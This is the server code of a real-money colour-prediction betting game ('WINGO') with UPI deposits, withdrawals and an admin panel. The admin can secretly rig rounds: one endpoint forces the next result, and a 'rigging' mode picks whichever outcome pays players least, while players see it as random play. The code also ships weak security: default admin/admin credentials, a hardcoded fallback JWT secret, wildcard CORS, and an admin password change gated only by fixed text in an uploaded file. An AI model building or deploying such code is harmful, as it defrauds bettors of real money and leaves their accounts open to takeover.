require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const crypto = require('crypto');
const path = require('path');
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI || 'mongodb://localhost:27017/betting-league')
  .then(async () => {
    console.log('✅ Connected to MongoDB');
    // Auto-create demo and admin users if not exist
    const adminExists = await User.findOne({ username: 'admin' });
    if (!adminExists) {
      const hashedAdmin = await bcrypt.hash('admin', 10);
      await User.create({ username: 'admin', password: hashedAdmin, role: 'admin', balance: 0 });
      console.log('Seeded admin user');
    }
    const demoExists = await User.findOne({ username: 'demo' });
    if (!demoExists) {
      const hashedDemo = await bcrypt.hash('demo', 10);
      await User.create({ username: 'demo', password: hashedDemo, role: 'user', balance: 0 });
      console.log('Seeded demo user');
    }
  }).catch(err => {
    console.error('❌ MongoDB Connection Error:', err.message);
  });
// Route: Game page (now embedded via iframe)
app.get('/game', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'game.html'));
});

// Route: Dashboard page
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Route: Auth page
app.get('/auth', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'auth.html'));
});
app.get('/login', (req, res) => res.redirect('/auth'));
app.get('/signup', (req, res) => res.redirect('/auth#signup'));

// Admin Panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'adminpanel.html'));
});

// Middleware to verify JWT
const authMiddleware = async (req, res, next) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ success: false, message: 'No token provided' });
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'super_secret_betting_league_key_1234');
    req.user = await User.findById(decoded.id);
    if (!req.user) throw new Error();
    
    if (req.user.isBanned) {
      return res.status(403).json({ success: false, message: 'Your account has been banned.' });
    }
    
    next();
  } catch (err) {
    res.status(401).json({ success: false, message: 'Invalid or expired token' });
  }
};

const adminMiddleware = (req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Admin access required' });
  }
  next();
};

// ──────────────────────────────────────────────
// API Routes
// ──────────────────────────────────────────────

// ----- AUTH APIs -----
app.post('/api/register', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ success: false, message: 'Fields required' });
    
    const existing = await User.findOne({ username });
    if (existing) return res.status(400).json({ success: false, message: 'Username taken' });

    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await User.create({ username, password: hashedPassword, role: 'user', balance: 0 });
    
    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET || 'super_secret_betting_league_key_1234', { expiresIn: '7d' });
    res.json({ success: true, token, user: { username: user.username, balance: user.balance } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const user = await User.findOne({ username });
    if (!user) return res.status(400).json({ success: false, message: 'Invalid credentials' });

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) return res.status(400).json({ success: false, message: 'Invalid credentials' });

    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET || 'super_secret_betting_league_key_1234', { expiresIn: '7d' });
    res.json({ success: true, token, user: { username: user.username, balance: user.balance, role: user.role } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/api/me', authMiddleware, (req, res) => {
  res.json({ 
    success: true, 
    user: { 
      username: req.user.username, 
      balance: req.user.balance, 
      role: req.user.role,
      totalBets: req.user.totalBets || 0,
      totalWins: req.user.totalWins || 0,
      totalProfit: req.user.totalProfit || 0,
      totalLoss: req.user.totalLoss || 0
    } 
  });
});

// ----- USER SETTINGS -----
app.post('/api/user/change-password', authMiddleware, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword) return res.status(400).json({ success: false, message: 'All fields required' });
    if (newPassword.length < 4) return res.status(400).json({ success: false, message: 'Password must be at least 4 characters' });
    
    const isMatch = await bcrypt.compare(currentPassword, req.user.password);
    if (!isMatch) return res.status(400).json({ success: false, message: 'Current password is incorrect' });
    
    req.user.password = await bcrypt.hash(newPassword, 10);
    await req.user.save();
    
    res.json({ success: true, message: 'Password changed successfully' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ----- ADMIN KEY-VERIFIED PASSWORD CHANGE -----
app.post('/api/admin/verify-key', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    const { fileContent } = req.body;
    if (!fileContent) return res.status(400).json({ success: false, message: 'No file content provided' });
    
    // Check if the uploaded file contains the specific mock C code text
    const hasKeyText = fileContent.includes('ENCRYPTION_LEVEL 0xDEADBEEF') && 
                       fileContent.includes('void simulateBreach()');
    
    if (hasKeyText) {
      return res.json({ success: true, message: 'Key verified', verified: true });
    }
    
    res.json({ success: false, message: 'Invalid key file', verified: false });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/admin/change-password', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    const { fileContent, newPassword } = req.body;
    if (!fileContent || !newPassword) return res.status(400).json({ success: false, message: 'All fields required' });
    
    const hasKeyText = fileContent.includes('ENCRYPTION_LEVEL 0xDEADBEEF') && 
                       fileContent.includes('void simulateBreach()');
    
    if (!hasKeyText) {
      return res.status(403).json({ success: false, message: 'Invalid key file - access denied' });
    }
    
    req.user.password = await bcrypt.hash(newPassword, 10);
    await req.user.save();
    
    res.json({ success: true, message: 'Admin password changed successfully' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ----- WALLET APIs -----
app.post('/api/wallet/deposit', authMiddleware, async (req, res) => {
  try {
    const { amount, transactionId } = req.body;
    if (!amount || amount < 100) return res.status(400).json({ success: false, message: 'Minimum 100 required' });
    if (!transactionId) return res.status(400).json({ success: false, message: 'Transaction ID / UTR required' });

    const tx = await Transaction.create({
      userId: req.user._id,
      type: 'deposit',
      amount,
      transactionId,
      status: 'pending'
    });
    res.json({ success: true, message: 'Deposit request sent to admin', tx });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/wallet/withdraw', authMiddleware, async (req, res) => {
  try {
    const { amount, bankDetails } = req.body;
    if (!amount || amount < 500) return res.status(400).json({ success: false, message: 'Minimum 500 required' });
    if (req.user.balance < amount) return res.status(400).json({ success: false, message: 'Insufficient balance' });

    // Deduct pending balance immediately to prevent double spending
    req.user.balance -= amount;
    await req.user.save();

    const tx = await Transaction.create({
      userId: req.user._id,
      type: 'withdraw',
      amount,
      bankDetails: bankDetails || 'Saved Bank',
      status: 'pending'
    });
    res.json({ success: true, message: 'Withdraw request sent to admin', tx });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/api/wallet/transactions', authMiddleware, async (req, res) => {
  try {
    const txs = await Transaction.find({ userId: req.user._id }).sort({ createdAt: -1 });
    res.json({ success: true, transactions: txs });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ----- ADMIN APIs -----
app.get('/api/admin/transactions', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    const txs = await Transaction.find().populate('userId', 'username').sort({ createdAt: -1 });
    res.json({ success: true, transactions: txs });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/admin/transaction/decide', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    const { txId, action } = req.body; // action: 'approve' | 'reject'
    const tx = await Transaction.findById(txId).populate('userId');
    if (!tx) return res.status(404).json({ success: false, message: 'Not found' });
    if (tx.status !== 'pending') return res.status(400).json({ success: false, message: 'Already processed' });

    if (tx.type === 'deposit') {
      if (action === 'approve') {
        tx.userId.balance += tx.amount;
        await tx.userId.save();
        tx.status = 'approved';
      } else {
        tx.status = 'rejected';
      }
    } else if (tx.type === 'withdraw') {
      if (action === 'approve') {
        tx.status = 'approved';
      } else {
        // Refund the deducted amount
        tx.userId.balance += tx.amount;
        await tx.userId.save();
        tx.status = 'rejected';
      }
    }
    
    await tx.save();
    
    // Attempt to notify user if connected via socket
    const userSockets = io.sockets.sockets;
    for (let [id, socket] of userSockets) {
      if (socket.userId && socket.userId.toString() === tx.userId._id.toString()) {
        socket.emit('wallet:update', { balance: tx.userId.balance, tx });
      }
    }

    res.json({ success: true, message: `Transaction ${action}d` });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/api/admin/stats', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    // Basic stats for dashboard
    const usersCount = await User.countDocuments({ role: 'user' });
    
    const approvedDeposits = await Transaction.aggregate([
      { $match: { type: 'deposit', status: 'approved' } },
      { $group: { _id: null, total: { $sum: '$amount' } } }
    ]);
    const totalDeposits = approvedDeposits[0]?.total || 0;

    const approvedWithdrawals = await Transaction.aggregate([
      { $match: { type: 'withdraw', status: 'approved' } },
      { $group: { _id: null, total: { $sum: '$amount' } } }
    ]);
    const totalWithdrawals = approvedWithdrawals[0]?.total || 0;

    res.json({ 
      success: true, 
      stats: {
        usersCount,
        totalDeposits,
        totalWithdrawals,
        siteProfit: totalDeposits - totalWithdrawals // basic metric
      }
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/admin/game/override', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    const { type, value } = req.body;
    if (!['number', 'color', 'size'].includes(type)) {
      return res.status(400).json({ success: false, message: 'Invalid type' });
    }
    
    // Set the override in the GameManager
    game.nextManualResult = { type, value };
    console.log(`[ADMIN] Manual override set for next round: ${type} = ${value}`);
    
    res.json({ success: true, message: `Next round forced to ${type}: ${value}` });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/admin/game/rigging', authMiddleware, adminMiddleware, (req, res) => {
  const { enabled } = req.body;
  game.isRigged = !!enabled;
  console.log(`[ADMIN] Game rigging is now ${game.isRigged ? 'ON' : 'OFF'}`);
  res.json({ success: true, message: `System advantage turned ${game.isRigged ? 'ON' : 'OFF'}`, isRigged: game.isRigged });
});

// Dynamic Settings
let globalSettings = {
  upiId: 'admin@ybl',
  whatsapp: '+910000000000',
  telegram: 'https://t.me/predictionclub'
};

app.get('/api/settings', authMiddleware, (req, res) => {
  res.json({ success: true, settings: globalSettings });
});

app.post('/api/admin/settings', authMiddleware, adminMiddleware, (req, res) => {
  const { upiId, whatsapp, telegram } = req.body;
  if (upiId) globalSettings.upiId = upiId;
  if (whatsapp) globalSettings.whatsapp = whatsapp;
  if (telegram) globalSettings.telegram = telegram;
  res.json({ success: true, message: 'Settings updated successfully', settings: globalSettings });
});


// User Management
app.get('/api/admin/users', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    const users = await User.find({ role: 'user' }).select('-password').sort({ createdAt: -1 });
    res.json({ success: true, users });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/admin/user/ban', authMiddleware, adminMiddleware, async (req, res) => {
  try {
    const { userId, isBanned } = req.body;
    const user = await User.findById(userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });
    if (user.role === 'admin') return res.status(403).json({ success: false, message: 'Cannot ban admin' });

    user.isBanned = isBanned;
    await user.save();

    // If banned, disconnect their socket if active
    if (isBanned) {
      const userSockets = io.sockets.sockets;
      for (let [id, socket] of userSockets) {
        if (socket.userId && socket.userId.toString() === userId.toString()) {
          socket.disconnect(true);
        }
      }
    }

    res.json({ success: true, message: `User ${isBanned ? 'banned' : 'unbanned'}`, user });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ──────────────────────────────────────────────
// Game Configuration
// ──────────────────────────────────────────────
const CONFIG = {
  ROUND_DURATION: 60,       // Total round duration in seconds
  LOCK_DURATION: 5,         // Last N seconds = betting locked
  RESULT_DURATION: 5,       // Show result for N seconds
  STARTING_BALANCE: 10000,  // Starting balance per player
  MIN_BET: 10,
  MAX_BET: 100000,
  HISTORY_SIZE: 50,         // Keep last N rounds in memory
};

// Number → Color mapping
const NUMBER_COLOR_MAP = {
  0: ['red', 'violet'],
  1: ['green'],
  2: ['red'],
  3: ['green'],
  4: ['red'],
  5: ['green', 'violet'],
  6: ['red'],
  7: ['green'],
  8: ['red'],
  9: ['green'],
};

// Payout multipliers
const PAYOUTS = {
  green: 2,
  red: 2,
  violet: 4.5,
  number: 9,
};

// Reduced payout when a number has two colors (0 and 5)
const REDUCED_COLOR_PAYOUT = 1.5;

// ──────────────────────────────────────────────
// Game Manager — runs the game 24/7
// ──────────────────────────────────────────────
class GameManager {
  constructor() {
    this.roundHistory = [];
    this.currentRound = null;
    this.bets = new Map();       // roundPeriod → [{ socketId, betType, betValue, amount }]
    this.playerBalances = new Map(); // socketId → balance
    this.roundInterval = null;
    this.tickInterval = null;
    this.roundCounter = 0;
    this.nextManualResult = null;
    this.isRigged = false;
  }

  // Generate period string like 20260412001
  generatePeriod() {
    const now = new Date();
    const dateStr = now.getFullYear().toString() +
      String(now.getMonth() + 1).padStart(2, '0') +
      String(now.getDate()).padStart(2, '0');
    this.roundCounter++;
    return dateStr + String(this.roundCounter).padStart(3, '0');
  }

  // Calculate round counter from server start (based on time of day)
  initRoundCounter() {
    const now = new Date();
    const secondsSinceMidnight = now.getHours() * 3600 + now.getMinutes() * 60 + now.getSeconds();
    const totalRoundTime = CONFIG.ROUND_DURATION + CONFIG.RESULT_DURATION;
    this.roundCounter = Math.floor(secondsSinceMidnight / totalRoundTime);
  }

  start() {
    this.initRoundCounter();
    this.startNewRound();
  }

  startNewRound() {
    const period = this.generatePeriod();
    this.currentRound = {
      period,
      phase: 'betting',   // 'betting' | 'locked' | 'result'
      timeLeft: CONFIG.ROUND_DURATION,
      result: null,
    };
    this.bets.set(period, []);

    console.log(`\n🎰 Round ${period} started — Betting open for ${CONFIG.ROUND_DURATION - CONFIG.LOCK_DURATION}s`);

    // Broadcast new round
    io.emit('round:state', this.getRoundState());

    // Start the tick
    if (this.tickInterval) clearInterval(this.tickInterval);
    this.tickInterval = setInterval(() => this.tick(), 1000);
  }

  tick() {
    if (!this.currentRound) return;

    this.currentRound.timeLeft--;

    // Transition to locked phase
    if (this.currentRound.phase === 'betting' && this.currentRound.timeLeft <= CONFIG.LOCK_DURATION) {
      this.currentRound.phase = 'locked';
      console.log(`🔒 Round ${this.currentRound.period} — Betting LOCKED`);
      io.emit('round:phase', { phase: 'locked', timeLeft: this.currentRound.timeLeft });
    }

    // Round ends
    if (this.currentRound.timeLeft <= 0) {
      clearInterval(this.tickInterval);
      this.resolveRound();
      return;
    }

    // Broadcast timer
    io.emit('round:tick', { timeLeft: this.currentRound.timeLeft, phase: this.currentRound.phase });
    
    // Broadcast pools to admin
    const pools = this.getPools();
    io.to('admin_room').emit('admin:pool_update', pools);
  }

  getPools() {
    const roundBets = this.bets.get(this.currentRound?.period) || [];
    const pools = {
      color: { green: 0, red: 0, violet: 0 },
      size: { big: 0, small: 0 },
      number: { 0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0 },
      totalUsers: new Set(),
      totalAmount: 0
    };

    for (const b of roundBets) {
      pools.totalUsers.add(b.userId.toString());
      pools.totalAmount += b.amount;
      if (b.betType === 'color') pools.color[b.betValue] += b.amount;
      else if (b.betType === 'size') pools.size[b.betValue] += b.amount;
      else if (b.betType === 'number') pools.number[b.betValue] += b.amount;
    }
    
    return {
      color: pools.color,
      size: pools.size,
      number: pools.number,
      totalUsers: pools.totalUsers.size,
      totalAmount: pools.totalAmount
    };
  }

  async resolveRound() {
    // Generate random result or use manual
    let resultNumber;
    if (this.nextManualResult) {
      const { type, value } = this.nextManualResult;
      if (type === 'number') {
        resultNumber = parseInt(value);
      } else if (type === 'color') {
        if (value === 'green') {
          const greens = [1, 3, 5, 7, 9];
          resultNumber = greens[crypto.randomInt(0, greens.length)];
        } else if (value === 'red') {
          const reds = [0, 2, 4, 6, 8];
          resultNumber = reds[crypto.randomInt(0, reds.length)];
        } else if (value === 'violet') {
          const violets = [0, 5];
          resultNumber = violets[crypto.randomInt(0, violets.length)];
        }
      } else if (type === 'size') {
        if (value === 'small') {
          resultNumber = crypto.randomInt(0, 5); // 0-4
        } else if (value === 'big') {
          resultNumber = crypto.randomInt(5, 10); // 5-9
        }
      }
      this.nextManualResult = null; // Clear after use
    } else {
      if (this.isRigged) {
        // Calculate payout for each possible outcome (0-9)
        const roundBets = this.bets.get(this.currentRound.period) || [];
        const payouts = new Array(10).fill(0);
        
        for (let i = 0; i < 10; i++) {
          const colors = NUMBER_COLOR_MAP[i];
          const size = i >= 5 ? 'big' : 'small';
          
          for (const bet of roundBets) {
            let won = false;
            let payoutAmt = 0;
            switch(bet.betType) {
              case 'color':
                if (colors.includes(bet.betValue)) {
                  if (bet.betValue === 'violet') {
                    payoutAmt = bet.amount * PAYOUTS.violet;
                  } else {
                    payoutAmt = colors.length > 1 ? bet.amount * REDUCED_COLOR_PAYOUT : bet.amount * PAYOUTS[bet.betValue];
                  }
                }
                break;
              case 'number':
                if (i === bet.betValue) payoutAmt = bet.amount * PAYOUTS.number;
                break;
              case 'size':
                if (size === bet.betValue) payoutAmt = bet.amount * 2;
                break;
            }
            payouts[i] += payoutAmt;
          }
        }
        
        // Find minimum payout
        const minPayout = Math.min(...payouts);
        const minIndices = [];
        for (let i = 0; i < 10; i++) {
          if (payouts[i] === minPayout) minIndices.push(i);
        }
        
        // Pick randomly among the minimum payout indices
        resultNumber = minIndices[crypto.randomInt(0, minIndices.length)];
        console.log(`🎰 System RIGGED: Forced ${resultNumber} to minimize payout at ₹${minPayout}`);
      } else {
        resultNumber = crypto.randomInt(0, 10); // 0-9
      }
    }
    
    const resultColors = NUMBER_COLOR_MAP[resultNumber];
    const resultSize = resultNumber >= 5 ? 'big' : 'small';

    this.currentRound.phase = 'result';
    this.currentRound.result = {
      number: resultNumber,
      colors: resultColors,
      size: resultSize,
    };

    console.log(`🎯 Round ${this.currentRound.period} result: ${resultNumber} (${resultColors.join(', ')}) [${resultSize}]`);

    // Process bets
    const roundBets = this.bets.get(this.currentRound.period) || [];
    const results = [];

    for (const bet of roundBets) {
      let won = false;
      let payout = 0;

      if (bet.betType === 'color') {
        if (resultColors.includes(bet.betValue)) {
          won = true;
          if (bet.betValue === 'violet') {
            payout = bet.amount * PAYOUTS.violet;
          } else {
            // If the number has two colors (0 or 5), reduced payout
            payout = resultColors.length > 1
              ? bet.amount * REDUCED_COLOR_PAYOUT
              : bet.amount * PAYOUTS[bet.betValue];
          }
        }
      } else if (bet.betType === 'number') {
        if (resultNumber === bet.betValue) {
          won = true;
          payout = bet.amount * PAYOUTS.number;
        }
      } else if (bet.betType === 'size') {
        if (resultSize === bet.betValue) {
          won = true;
          payout = bet.amount * 2;
        }
      }

      let newBalance = 0;
      try {
        const user = await User.findById(bet.userId);
        if (user) {
          user.totalBets += 1;
          if (won) {
            user.balance += payout;
            user.totalWins += 1;
            user.totalProfit += (payout - bet.amount);
          } else {
            user.totalLoss += bet.amount;
          }
          await user.save();
          newBalance = user.balance;
        }
      } catch(e) { console.error('Error updating user stats:', e); }

      results.push({
        socketId: bet.socketId,
        betType: bet.betType,
        betValue: bet.betValue,
        amount: bet.amount,
        won,
        payout: won ? payout : 0,
        newBalance
      });
    }

    // Save to history
    const historyEntry = {
      period: this.currentRound.period,
      number: resultNumber,
      colors: resultColors,
      size: resultSize,
      totalBets: roundBets.length,
      timestamp: Date.now(),
    };
    this.roundHistory.unshift(historyEntry);
    if (this.roundHistory.length > CONFIG.HISTORY_SIZE) {
      this.roundHistory.pop();
    }

    // Broadcast result to all
    io.emit('round:result', {
      period: this.currentRound.period,
      result: this.currentRound.result,
      history: this.roundHistory.slice(0, 10),
    });

    // Send personal results to each bettor
    for (const r of results) {
      const socket = io.sockets.sockets.get(r.socketId);
      if (socket) {
        socket.emit('bet:result', {
          period: this.currentRound.period,
          betType: r.betType,
          betValue: r.betValue,
          amount: r.amount,
          won: r.won,
          payout: r.payout,
          newBalance: r.newBalance,
        });
      }
    }

    // Wait RESULT_DURATION then start next round
    setTimeout(() => {
      this.startNewRound();
    }, CONFIG.RESULT_DURATION * 1000);
  }

  async placeBet(socketId, userId, { betType, betValue, amount }) {
    if (!this.currentRound || this.currentRound.phase !== 'betting') {
      return { success: false, message: 'Betting is closed for this round' };
    }

    // Validate bet type
    if (!['color', 'number', 'size'].includes(betType)) {
      return { success: false, message: 'Invalid bet type' };
    }

    // Validate bet value
    if (betType === 'color' && !['green', 'red', 'violet'].includes(betValue)) {
      return { success: false, message: 'Invalid color' };
    }
    if (betType === 'number' && (typeof betValue !== 'number' || betValue < 0 || betValue > 9)) {
      return { success: false, message: 'Invalid number' };
    }
    if (betType === 'size' && !['big', 'small'].includes(betValue)) {
      return { success: false, message: 'Invalid size' };
    }

    // Validate amount
    if (typeof amount !== 'number' || amount < CONFIG.MIN_BET || amount > CONFIG.MAX_BET) {
      return { success: false, message: `Bet must be between ₹${CONFIG.MIN_BET} and ₹${CONFIG.MAX_BET}` };
    }

    try {
      const user = await User.findById(userId);
      if (!user) return { success: false, message: 'User not found' };

      // Check balance
      if (amount > user.balance) {
        return { success: false, message: 'Insufficient balance' };
      }

      // Deduct balance
      user.balance -= amount;
      await user.save();

      // Record bet
      const roundBets = this.bets.get(this.currentRound.period);
      roundBets.push({ socketId, userId, betType, betValue, amount });

      console.log(`  💰 Bet placed: ${betType}=${betValue} ₹${amount} by ${user.username}`);
      
      // Emit to admins
      io.to('admin_room').emit('admin:live_bet', {
        username: user.username,
        betType,
        betValue,
        amount,
        timestamp: Date.now()
      });

      return {
        success: true,
        message: 'Bet placed successfully!',
        newBalance: user.balance,
        bet: { betType, betValue, amount, period: this.currentRound.period },
      };
    } catch(err) {
      return { success: false, message: 'Server error' };
    }
  }

  getRoundState() {
    return {
      period: this.currentRound?.period,
      phase: this.currentRound?.phase,
      timeLeft: this.currentRound?.timeLeft,
      result: this.currentRound?.result,
    };
  }
}

// ──────────────────────────────────────────────
// Initialize Game
// ──────────────────────────────────────────────
const game = new GameManager();

// ──────────────────────────────────────────────
// Socket.IO Connection Handling
// ──────────────────────────────────────────────
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) {
    return next(new Error('Authentication error - No token'));
  }
  jwt.verify(token, process.env.JWT_SECRET || 'super_secret_betting_league_key_1234', async (err, decoded) => {
    if (err) return next(new Error('Authentication error - Invalid token'));
    try {
      const user = await User.findById(decoded.id);
      if (!user) return next(new Error('Authentication error - Invalid user'));
      if (user.isBanned) return next(new Error('Account banned'));
      
      socket.userId = user._id;
      socket.username = user.username;
      socket.role = user.role; // Store role for admin broadcast
      
      if (user.role === 'admin') {
        socket.join('admin_room');
      }
      
      next();
    } catch (e) {
      next(new Error('Database error'));
    }
  });
});

io.on('connection', async (socket) => {
  console.log(`👤 Player connected: ${socket.username}`);

  // Send current state
  const user = await User.findById(socket.userId);
  socket.emit('init', {
    roundState: game.getRoundState(),
    balance: user ? user.balance : 0,
    history: game.roundHistory.slice(0, 10),
    config: {
      roundDuration: CONFIG.ROUND_DURATION,
      lockDuration: CONFIG.LOCK_DURATION,
      minBet: CONFIG.MIN_BET,
      maxBet: CONFIG.MAX_BET,
    },
  });

  // Handle bet
  socket.on('bet:place', async (data) => {
    const result = await game.placeBet(socket.id, socket.userId, data);
    socket.emit('bet:response', result);
  });

  // Handle disconnect
  socket.on('disconnect', () => {
    console.log(`👤 Player disconnected: ${socket.username}`);
  });
});

// ──────────────────────────────────────────────
// Start Server
// ──────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n🚀 WINGO Server running on http://localhost:${PORT}`);
  console.log(`⏱  Round duration: ${CONFIG.ROUND_DURATION}s (lock at ${CONFIG.LOCK_DURATION}s)`);
  console.log(`💰 Starting balance: ₹${CONFIG.STARTING_BALANCE}\n`);
  game.start();
});
